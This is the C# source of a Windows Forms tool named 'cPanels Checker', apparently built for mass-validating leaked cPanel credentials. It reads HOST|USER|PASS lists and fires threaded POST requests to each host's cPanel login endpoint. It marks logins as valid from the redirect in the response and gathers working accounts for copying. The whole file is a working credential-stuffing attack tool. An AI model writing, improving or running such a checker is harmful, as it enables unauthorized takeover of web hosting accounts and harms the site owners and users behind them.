using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using Leaf.xNet;

namespace cPanels_Checker___By_Mf4Tn
{
    public partial class Form1 : Form
    {
        OpenFileDialog file = new OpenFileDialog();
        int valid, invalid = 0;
        public Form1()
        {
            InitializeComponent();
        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            int yes = 0;
            if(file.ShowDialog() == DialogResult.OK)
            {
                List<string> check = new List<string>();
                richTextBox1.Text = "";
                foreach(var line in File.ReadAllLines(file.FileName))
                {
                    try
                    {
                        if(!check.Contains(line) && line.Split('|').Length == 3)
                        {
                            check.Add(line);
                            yes++;
                            richTextBox1.Text += line+"\n\n";
                        }
                    }
                    catch
                    {

                    }
                }
                label4.Text = yes.ToString();
                MessageBox.Show($"'{label4.Text}' cPanels Load !", "Done", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
            if(richTextBox1.Text != "")
            {
                List<string> check = new List<string>();
                int yes = 0;
                foreach (var line in richTextBox1.Text.Split('\n'))
                {
                    try
                    {
                        if (!check.Contains(line) && line.Split('|').Length == 3)
                        {
                            check.Add(line);
                            yes++;
                        }
                    }
                    catch
                    {

                    }
                }
                label4.Text = yes.ToString();
                //MessageBox.Show($"'{label4.Text}' cPanels Load !", "Done", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            
        }

        private void richTextBox2_DoubleClick(object sender, EventArgs e)
        {
            Clipboard.SetText(richTextBox2.Text.Replace("\n\n", "\n"));
            MessageBox.Show("Text Copied To Your Clipboard", "Done", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if(richTextBox1.Text != "" && richTextBox1.Text != "HOST|USER|PASS")
            {
                List<string> check = new List<string>();
                richTextBox2.Text = "";
                int finish = 0;
                foreach(var cp in richTextBox1.Text.Split('\n'))
                {
                    
                    if(cp != "" && !check.Contains(cp))
                    {
                        check.Add(cp);
                        new Thread(() =>
                        {
                            try
                            {
                                HttpRequest request = new HttpRequest();
                                request.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                                request.ConnectTimeout = 25000;
                                var response = request.Post(cp.Split('|')[0] + "/login/?login_only=1", $"user={cp.Split('|')[1]}&pass={cp.Split('|')[2]}&goto_uri=%2F", "application/x-www-form-urlencoded");
                                if (response.ToString().Contains("redirect\":\""))
                                {
                                    richTextBox2.Invoke(new MethodInvoker(delegate
                                    {
                                        richTextBox2.Text += cp + "\n\n";
                                    }));
                                    valid++;

                                }
                                else
                                {
                                    invalid++;
                                }
                            }
                            catch (Exception ex){ invalid++; finish++; }
                            label6.Invoke(new MethodInvoker(delegate
                            {
                                label6.Text = valid.ToString();
                            }));
                            label5.Invoke(new MethodInvoker(delegate
                            {
                                label5.Text = invalid.ToString();
                            }));
                        })
                        { IsBackground = true }.Start();
                    }

                    

                }
                
            }
        }
    }
}
